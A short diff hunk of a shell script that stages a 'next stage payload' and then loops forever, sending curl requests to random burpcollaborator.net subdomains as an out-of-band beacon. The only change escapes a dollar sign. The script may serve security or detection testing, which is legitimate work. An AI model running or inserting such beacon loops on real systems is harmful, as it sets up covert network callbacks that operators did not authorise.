@@ -169,7 +169,7 @@ log "starting next stage after $SECONDS_WAITED seconds..."
 log "starting execution of next stage payload..."
 START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
 while true; do
-    OAST_URL="https://$(cat /dev/urandom | tr -dc '[:lower:]' | fold -w ${1:-16} | head -n 1).burpcollaborator.net"
+    OAST_URL="https://$(cat /dev/urandom | tr -dc '[:lower:]' | fold -w $${1:-16} | head -n 1).burpcollaborator.net"
     log "http request: $OAST_URL"
     curl -s "$OAST_URL" >> $LOGFILE 2>&1
     log 'waiting 69 seconds...';
